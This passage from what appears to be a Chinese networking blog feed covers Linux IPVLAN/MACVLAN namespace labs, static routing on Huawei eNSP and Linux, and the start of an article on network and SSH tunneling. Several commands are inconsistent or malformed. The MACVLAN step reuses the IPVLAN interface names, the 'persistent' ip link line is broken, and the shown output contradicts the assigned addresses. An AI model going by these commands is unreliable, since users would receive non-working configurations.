</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 192.168.0.1: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>0.051 ms
</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 192.168.0.1: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>0.059 ms
</span></span><span class="line"><span class="cl">^C
</span></span><span class="line"><span class="cl">--- 192.168.0.1 ping statistics ---
</span></span><span class="line"><span class="cl"><span class="m">2</span> packets transmitted, <span class="m">2</span> received, 0% packet loss, <span class="nb">time</span> 1056ms
</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 0.051/0.055/0.059/0.004 ms
</span></span></code></pre></td></tr></table>
</div>
</div><p>遇到问题</p>
<ul>
<li>
<p><strong>RTNETLINK answers: Operation not supported</strong>： CentOS 7默认内核版本为3.10 IPVLAN 3.19开始支持，推荐内核为4.2+</p>
</li>
<li>
<p>子接口ping父接口不通，源MAC与目标MAC是一致，而mac接口是mac地址与接口绑定，因为三个接口的mac地址都相同，此时区分不了是哪个接口。</p>
</li>
<li>
<p>ping公网地址不通，查看路由表中没有对外的路由，手动添加即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 route -n
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 route add -net 0.0.0.0/0 gw 10.0.0.2
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>IPVLAN L2模式中，父接口是可以没有IP地址的。不影响子接口的使用</p>
</li>
</ul>
<p>清除所有网络名称空间</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> n in <span class="k">$(</span>ip netns list<span class="p">|</span>awk <span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span><span class="p">;</span><span class="k">do</span> ip netns del <span class="nv">$n</span><span class="p">;</span><span class="k">done</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="实验三ipvlan-l3">实验三：IPVLAN L3</h3>
<p>先创建两个用做测试的 network namespace</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip netns add net3
</span></span><span class="line"><span class="cl">ip netns add net4
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建出 IPVLAN 的虚拟网卡接口，创建 IPVLAN 虚拟接口的命令和 MACVLAN 格式相同：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link add ipvl01 link ens33 <span class="nb">type</span> ipvlan mode l3
</span></span><span class="line"><span class="cl">ip link add ipvl02 link ens33 <span class="nb">type</span> ipvlan mode l3
</span></span></code></pre></td></tr></table>
</div>
</div><p>把 IPVLAN 接口放到前面创建好的 namespace 中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link <span class="nb">set</span> ipvl01 netns net3
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> ipvl02 netns net4
</span></span><span class="line"><span class="cl"><span class="c1"># 给对应设备设置IP地址</span>
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net3 ifconfig ipvl01 192.168.10.1/24 up
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net4 ifconfig ipvl02 192.168.20.1/24 up
</span></span><span class="line"><span class="cl"><span class="c1"># 设置对应的路由</span>
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net4 route add -net 192.168.10.0/24 dev ipvl02
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net3 route add -net 192.168.20.0/24 dev ipvl01
</span></span></code></pre></td></tr></table>
</div>
</div><p>结果是可以通的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ip netns <span class="nb">exec</span> net3 ping 192.168.20.1
</span></span><span class="line"><span class="cl">PING 192.168.20.1 <span class="o">(</span>192.168.20.1<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 192.168.20.1: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>0.026 ms
</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 192.168.20.1: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>0.119 ms
</span></span><span class="line"><span class="cl">^C
</span></span><span class="line"><span class="cl">--- 192.168.20.1 ping statistics ---
</span></span><span class="line"><span class="cl"><span class="m">2</span> packets transmitted, <span class="m">2</span> received, 0% packet loss, <span class="nb">time</span> 1028ms
</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 0.026/0.072/0.119/0.046 ms
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="实验四macvlan">实验四：MACVLAN</h3>
<p>创建两个名称空间</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip netns add net1
</span></span><span class="line"><span class="cl">ip netns add net2
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建两个 MACVLAN 接口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link add link eth0 name macv1 <span class="nb">type</span> macvlan mode bridge
</span></span><span class="line"><span class="cl">ip link add link eth0 name macv2 <span class="nb">type</span> macvlan mode bridge
</span></span><span class="line"><span class="cl"><span class="c1">## 持久化创建</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ip link add eth0 eth0.1 address 52:54:00:cc:ee:aa link enp0s31f6 type macvlan&#34;</span> &gt; /sbin/ifup-pre-local2
</span></span></code></pre></td></tr></table>
</div>
</div><p>把 MACVLAN 接口放到前面创建好的 namespace 中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link <span class="nb">set</span> macv1 netns net1
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> macv2 netns net2
</span></span><span class="line"><span class="cl"><span class="c1"># 给对应设备设置IP地址</span>
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ifconfig ipvl01 192.168.10.1/24 up
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net2 ifconfig ipvl02 192.168.20.1/24 up
</span></span><span class="line"><span class="cl"><span class="c1"># 设置对应的路由</span>
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 route add -net 192.168.10.0/24 dev ipvl02
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net2 route add -net 192.168.20.0/24 dev ipvl01
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到两个网卡的MAC地址是不同的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ip netns <span class="nb">exec</span> net2 ifconfig
</span></span><span class="line"><span class="cl">macv2: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
</span></span><span class="line"><span class="cl">        inet 192.168.10.1  netmask 255.255.255.0  broadcast 192.168.10.255
</span></span><span class="line"><span class="cl">        inet6 fe80::a830:c9ff:fe9a:7c33  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class="line"><span class="cl">        ether aa:30:c9:9a:7c:33  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">0</span>  bytes <span class="m">0</span> <span class="o">(</span>0.0 B<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">7</span>  bytes <span class="m">586</span> <span class="o">(</span>586.0 B<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ip netns <span class="nb">exec</span> net1 ifconfig
</span></span><span class="line"><span class="cl">macv1: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
</span></span><span class="line"><span class="cl">        inet 192.168.10.1  netmask 255.255.255.0  broadcast 192.168.10.255
</span></span><span class="line"><span class="cl">        inet6 fe80::d448:c5ff:fec7:76a3  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class="line"><span class="cl">        ether d6:48:c5:c7:76:a3  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">0</span>  bytes <span class="m">0</span> <span class="o">(</span>0.0 B<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">8</span>  bytes <span class="m">656</span> <span class="o">(</span>656.0 B<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="reference">Reference</h2>
<blockquote>
<p><sup id="1">[1]</sup> <a href="https://man7.org/linux/man-pages/man4/veth.4.html">man veth</a></p>
<p><sup id="2">[2]</sup> <a href="https://hicu.be/bridge-vs-macvlan">macvlan</a></p>
<p><sup id="3">[3]</sup> <a href="https://superuser.com/questions/1113812/how-to-configure-macvlan-interface-for-getting-the-ip">how to configure macvlan interface for getting the IP?</a></p>
<p><sup id="4">[4]</sup> <a href="https://community.fs.com/blog/how-to-choose-the-right-distribution-switch.html">distribution switch</a></p>
<p><sup id="5">[5]</sup> <a href="https://nwktimes.blogspot.com/2018/02/vxlan-part-i-why-vxlan-is-needed.html">why vxlan is needed</a></p>
<p><sup id="4">[4]</sup> <a href="">distribution switch</a></p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>静态路由</title>
      <link>https://www.oomkill.com/2021/01/static-routing/</link>
      <pubDate>Mon, 18 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/static-routing/</guid>
      <description></description>
      <content:encoded><![CDATA[<p>在因特网中，网络连接设备用来控制网络流量和保证网络数据传输质量。常见的网络连接设备有集线器（Hub）、网桥（Bridge）、交换机（Switch）和路由器（Router）。</p>
<p>路由器是一种典型的网络连接设备，用来进行路由选择和报文转发。路由器根据收到报文的目的地址选择一条合适的路径（包含一个或多个路由器的网络），然后将报文传送到下一个路由器，路径终端的路由器负责将报文送交目的主机。</p>
<p><strong>路由</strong>（<strong>routing</strong>）就是报文从源地址传输到目的地址的活动。路由发生在OSI网络参考模型中的第三层即<strong>网络层</strong>。当报文从路由器到目的网段有多条路由可达时，路由器可以根据路由表中最佳路由进行转发。最佳路由的选取与发现此路由的路由协议的优先级、路由的度量有关。当多条路由的协议优先级。</p>
<p>路由是数据通信网络中最基本的要素。路由信息就是指导报文发送的路径信息，路由的过程就是报文转发的过程。</p>
<p>根据路由目的地的不同，路由可划分为：</p>
<ul>
<li>
<p>网段路由：目的地为网段，IPv4地址子网掩码长度小于32位或IPv6地址前缀长度小于128位。</p>
</li>
<li>
<p>主机路由：目的地为主机，IPv4地址子网掩码长度为32位或IPv6地址前缀长度为128位。</p>
</li>
</ul>
<p>根据目的地与该路由器是否直接相连，路由又可划分为：</p>
<ul>
<li>
<p>直连路由：目的地所在网络与路由器直接相连。</p>
</li>
<li>
<p>间接路由：目的地所在网络与路由器非直接相连。</p>
</li>
<li>
<p>根据目的地址类型的不同，路由还可以分为：</p>
</li>
<li>
<p>单播路由：表示将报文转发的目的地址是一个单播地址。</p>
</li>
<li>
<p>组播路由：表示将报文转发的目的地址是一个组播地址。</p>
</li>
</ul>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/routing-diagram-16615240071381.svg" alt="IP 路由图"  /></p>
<h3 id="路由的优先级">路由的优先级</h3>
<p>对于相同的目的地，不同的路由协议（包括静态路由）可能会发现不同的路由，但这些路由并不都是最优的。事实上，在某一时刻，到某一目的地的当前路由仅能由唯一的路由协议来决定。为了判断最优路由，各路由协议（包括静态路由）都被赋予了一个优先级，当存在多个路由信息源时，具有较高优先级（取值较小）的路由协议发现的路由将成为最优路由，并将最优路由放入本地路由表中。</p>
<table>
<thead>
<tr>
<th>路由协议</th>
<th>优先级</th>
</tr>
</thead>
<tbody>
<tr>
<td>DIRECT</td>
<td>0</td>
</tr>
<tr>
<td>OSPF</td>
<td>10</td>
</tr>
<tr>
<td>IS-IS</td>
<td>IS-IS Level1 15<br>IS-IS Level 2</td>
</tr>
<tr>
<td>由网关加入的路由</td>
<td>50</td>
</tr>
<tr>
<td>路由器发现的路由</td>
<td>55</td>
</tr>
<tr>
<td>静态路由</td>
<td>60</td>
</tr>
<tr>
<td>UNR（User Network Route）</td>
<td>DHCP（Dynamic Host Configuration Protocol）：60<br/>AAA-Download：60<br/>IP Pool：61<br/>Frame：62<br/>Host：63<br/>NAT（Network Address Translation）：64<br/>IPSec（IP Security）：65<br/>NHRP（Next Hop Resolution Protocol）：65<br/>PPPoE（Point-to-Point Protocol over Ethernet）：65</td>
</tr>
<tr>
<td>Berkeley RIP</td>
<td>100</td>
</tr>
<tr>
<td>点对点接口聚集的路由</td>
<td>110</td>
</tr>
<tr>
<td>OSPF的扩展路由</td>
<td>140</td>
</tr>
<tr>
<td>OSPF ASE</td>
<td>150</td>
</tr>
<tr>
<td>OSPF NSSA</td>
<td>150</td>
</tr>
<tr>
<td>BGP</td>
<td>170</td>
</tr>
<tr>
<td>EGP</td>
<td>200</td>
</tr>
<tr>
<td>IBGP</td>
<td>255</td>
</tr>
<tr>
<td>EBGP</td>
<td>255</td>
</tr>
</tbody>
</table>
<ol>
<li>其中，0表示直接连接的路由，255表示任何来自不可信源端的路由；数值越小表明优先级越高。</li>
<li>除直连路由（DIRECT）外，各种路由协议的优先级都可由用户手工进行配置。另外，每条静态路由的优先级都可以不相同。</li>
</ol>
<p>路由器根据路由转发数据包，路由可通过手动配置和使用动态路由算法计算产生，其中<strong>手动配置的路由就是静态路由</strong>。</p>
<p>静态路由比动态路由使用更少的带宽，并且不占用CPU资源来计算和分析路由更新。但是当网络发生故障或者拓扑发生变化后，静态路由不会自动更新，必须手动重新配置。静态路由有5个主要的参数：目的地址、掩码、出接口、下一跳、优先级。</p>
<ul>
<li>目的地址和掩码:</li>
</ul>
<p>IPv4的目的地址为点分十进制格式，掩码可以用点分十进制表示，也可用掩码长度（即掩码中连续‘1’的位数）表示。当目的地址和掩码都为零时，表示静态缺省路由。</p>
<ul>
<li>出接口和下一跳地址:</li>
</ul>
<p>在配置静态路由时，根据不同的出接口类型，指定出接口和下一跳地址。</p>
<p>对于点到点类型的接口，只需指定出接口。因为指定发送接口即隐含指定了下一跳地址，这时认为与该接口相连的对端接口地址就是路由的下一跳地址。</p>
<p>对于NBMA（Non Broadcast Multiple Access）类型的接口（如ATM接口），配置下一跳IP地址。因这类接口支持点到多点网络，除了配置静态路由外，还需在链路层建立IP地址到链路层地址的映射，这种情况下，不需要指定
出接口。</p>
<p>对于广播类型的接口（如以太网接口）和VT（Virtual-template）接口，必须指定通过该接口发送时对应的下一跳地址。因为以太网接口是广播类型的接口，而VT接口下可以关联多个虚拟访问接口（Virtual Access Interface），这都会导致出现多个下一跳，无法唯一确定下一跳。</p>
<ul>
<li>静态路由优先级</li>
</ul>
<p>对于不同的静态路由，可以为它们配置不同的优先级，优先级数字越小优先级越高。配置到达相同目的地的多条静态
路由，如果指定相同优先级，则可实现负载分担；如果指定不同优先级，则可实现路由备份。</p>
<h3 id="实验-在ensp实现静态路由配置">实验： 在eNsp实现静态路由配置</h3>
<p>通信是双向的，因此要留意往返流量（的路由）。</p>
<p>路由的行为是逐跳的，因此需保证沿途的每一台路由器都有路由</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;Huawei&gt;system-view 
</span></span><span class="line"><span class="cl"><span class="o">[</span>Huawei<span class="o">]</span>sysname ar1
</span></span><span class="line"><span class="cl"><span class="o">[</span>ar1<span class="o">]</span>interface g0/0/0
</span></span><span class="line"><span class="cl"><span class="o">[</span>ar1-GigabitEthernet0/0/0<span class="o">]</span>ip address 192.168.10.1 <span class="m">24</span>
</span></span><span class="line"><span class="cl">Jan <span class="m">23</span> <span class="m">2021</span> 20:52:30-08:00 ar1 %%01IFNET/4/LINK_STATE<span class="o">(</span>l<span class="o">)[</span>0<span class="o">]</span>:The line protocol IP
</span></span><span class="line"><span class="cl"> on the interface GigabitEthernet0/0/0 has entered the UP state. 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>ar1-GigabitEthernet0/0/0<span class="o">]</span>dis this
</span></span><span class="line"><span class="cl"><span class="o">[</span>V200R003C00<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/0
</span></span><span class="line"><span class="cl"> ip address 192.168.10.1 255.255.255.0 
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Huawei-GigabitEthernet0/0/1<span class="o">]</span>display ip interface brief 
</span></span><span class="line"><span class="cl">*down: administratively down
</span></span><span class="line"><span class="cl">^down: standby
</span></span><span class="line"><span class="cl"><span class="o">(</span>l<span class="o">)</span>: loopback
</span></span><span class="line"><span class="cl"><span class="o">(</span>s<span class="o">)</span>: spoofing
</span></span><span class="line"><span class="cl">The number of interface that is UP in Physical is <span class="m">3</span>
</span></span><span class="line"><span class="cl">The number of interface that is DOWN in Physical is <span class="m">0</span>
</span></span><span class="line"><span class="cl">The number of interface that is UP in Protocol is <span class="m">3</span>
</span></span><span class="line"><span class="cl">The number of interface that is DOWN in Protocol is <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Interface                         IP Address/Mask      Physical   Protocol  
</span></span><span class="line"><span class="cl">GigabitEthernet0/0/0              192.168.20.1/24      up         up        
</span></span><span class="line"><span class="cl">GigabitEthernet0/0/1              192.168.30.1/24      up         up        
</span></span><span class="line"><span class="cl">NULL0                             unassigned           up         up<span class="o">(</span>s<span class="o">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 查看所有路由</span>
</span></span><span class="line"><span class="cl">dis ip routing-table
</span></span><span class="line"><span class="cl"><span class="c1"># 删除命令</span>
</span></span><span class="line"><span class="cl">undo ip address 192.168.10.1 255.255.255.0 
</span></span><span class="line"><span class="cl"><span class="c1"># 查看bgp协议路由</span>
</span></span><span class="line"><span class="cl">dis ip routing-table
</span></span><span class="line"><span class="cl"><span class="c1"># 设置静态路由</span>
</span></span><span class="line"><span class="cl">ip routing-static 192.168.0.0 <span class="m">24</span> 192.168.1.1
</span></span><span class="line"><span class="cl"><span class="c1"># 保存配置命令 &lt;用户模式&gt; save即可保存</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>eNSP实验拓扑：<a href="../../../images/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1.zip">静态路由.zip</a></p>
<p></p>
<h2 id="linux中的路由">Linux中的路由</h2>
<p>Linux系统的<code>route</code> 与<code>ip route</code> 命令用于显示和操作IP路由表（show/manipulate the IP routing table)。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。在Linux系统中，设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问internet，那么就需要将网关地址设置为该Linux机器的默认路由。需要注意的是，<strong>命令行执行的route操作不会持久化</strong>，当网卡重启或者机器重启之后，该路由就失效了；可以在/etc/rc.local中添加route命令来保证该路由设置永久有效。</p>
<p><code>route -n</code> 命令显示的字段说明</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Destination</td>
<td>目标网段或是主机</td>
</tr>
<tr>
<td>Gateway</td>
<td>网关地址 [<code>*</code>标识目标是本机所属的网络，不需要路由]</td>
</tr>
<tr>
<td>Genmask</td>
<td>网络掩码</td>
</tr>
<tr>
<td>flags</td>
<td>标记[可选如下]<br/>U - 路由是活动的<br/>H - 目标是一个主机<br/>G - 路由指向网关<br/>R - 恢复动态路由产生的表项<br/>D - 由动态路由后台程序动态的安装<br/>M - 由路由的后台程序修改<br/>! - 拒绝路由</td>
</tr>
<tr>
<td>Metric</td>
<td>路由距离，到达指定网络需要的中转数[Linux内核中没有引用]</td>
</tr>
<tr>
<td>Ref</td>
<td>路由项引用册数[Linux内核中没有引用]</td>
</tr>
<tr>
<td>Use</td>
<td>次路由项被路由软件查找的次数</td>
</tr>
<tr>
<td>Iface</td>
<td>该路由表项输出的路由接口</td>
</tr>
</tbody>
</table>
<p>Linux开启IP转发功能，Linux主机可以是一个路由器 <code>sysctl -w net.ipv4.ip_forward=1</code></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>网络隧道技术</title>
      <link>https://www.oomkill.com/2021/01/network-tunnel-technology/</link>
      <pubDate>Mon, 18 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/network-tunnel-technology/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="隧道技术概要">隧道技术概要</h2>
<p>隧道技术（<em><strong>Tunneling</strong></em>）是网络基础设置在网络之间传递数据的方式，使用隧道技术传递可以是不同协议的数据包，隧道协议将这些其他协议的数据包重新封装在新的包头中发送。被封装的数据包在隧道的两个端点之间通过网络进行路由，<strong>被封装数据包在网络上传递时所经历的逻辑路径称为隧道</strong>。</p>
<p>简单来说，<font style="background:#f8070d;" size=3>隧道技术是一类网络协议</font>，是将一个数据包封装在另一个数据包中进行传输的技术；**使用隧道的原因是在不兼容的网络上传输数据，或在不安全网络上提供一个安全路径。**通过网络隧道技术，可以使隧道两端的网络组成一个更大的内部网络。（把不支持的协议数据包打包成支持的协议数据包之后进行传输）。</p>
<h2 id="隧道协议">隧道协议</h2>
<p>要创建隧道，隧道的客户机和服务器双方必须使用相同的隧道技术，隧道协议有二层隧道协议与三层隧道协议两类。</p>
<p>二层隧道协议对应OSI模型中数据链路层，使用 <strong>帧</strong> 作为数据交换单位，PPTP、L2TP、L2F都属于二层隧道协议。是将数据封装在点对点协议的帧中通过互联网络发送。</p>
<p>三层隧道协议对应OSI模型中网络层，使用 <strong>包</strong> 作为数据交换单位，GRE、IPSec 都属于三层隧道协议。都是数据包封装在附加的IP包头中通过IP网络传送。</p>
<p>在例如VxLAN，工作在传输层和网络层之间。具体来说，将运行在用户数据报协议 (UDP) 和网络数据报协议 (IP) 之间，以便在网络中建立安全的通信通道。</p>
<h2 id="网络隧道技术应用">网络隧道技术应用</h2>
<h3 id="隧道在linux-中应用">隧道在Linux 中应用</h3>
<p>IP隧道是指一种可在两网络间进行通信的通道。在该通道里，会先封装其他网络协议的数据包，之后再传输信息。</p>
<p>Linux原生共支持5种IPIP隧道：</p>
<ul>
<li>ipip: 普通的IPIP隧道，就是在报文的基础上再封装成一个IPv4报文</li>
<li>gre: 通用路由封装（Generic Routing Encapsulation），定义了在任意一种网络层协议上封装其他任意一种网络层协议的机制，所以对于IPv4和IPv6都适用</li>
<li>sit: sit模式主要用于IPv4报文封装IPv6报文，即IPv6 over IPv4</li>
<li>isatap: 站内自动隧道寻址协议（Intra-Site Automatic Tunnel Addressing Protocol），类似于sit也是用于IPv6的隧道封装</li>
<li>vti: 即虚拟隧道接口（Virtual Tunnel Interface），是一种IPsec隧道技术</li>
</ul>
<p>像IPVS/LVS中的 <code>Virtual Server via IP Tunneling</code>，就是使用了IPIP隧道</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/1b499670.png" alt="1b499670"  /></p>
<h3 id="ssh隧道技术">SSH隧道技术</h3>
<p>SSH提供了一个重要功能，称为转发 <font color=#f8070d size=3><code>forwarding</code></font> 或者称为隧道传输<font color=#f8070d size=3><code>tunneling</code></font>，它可以通过加密频道将明文流量导入隧道中，在创建SSH隧道时， SSH客户端要设置并转交一个特定本地端口号到远程机器上；一旦SSH隧道创建，用户可以连到指定的本地端口号以访问网络服务。本地端口号不用与远地端口号一样。</p>
<p>SSH隧道主要使用场景一般为 <strong>规避防火墙</strong>、<strong>加密网络流量</strong></p>
<p><strong>规避防火墙</strong>，SSH隧道可以使一个被防火墙阻挡的协议可被包在另一个没被防火墙阻挡的协议里，这技巧可用来逃避防火墙政策。而这种操作符合“数据包封装在另一个数据包中进行传输的技术”，故称为SSH隧道技术。</p>
<h3 id="ssh隧道类型">SSH隧道类型</h3>
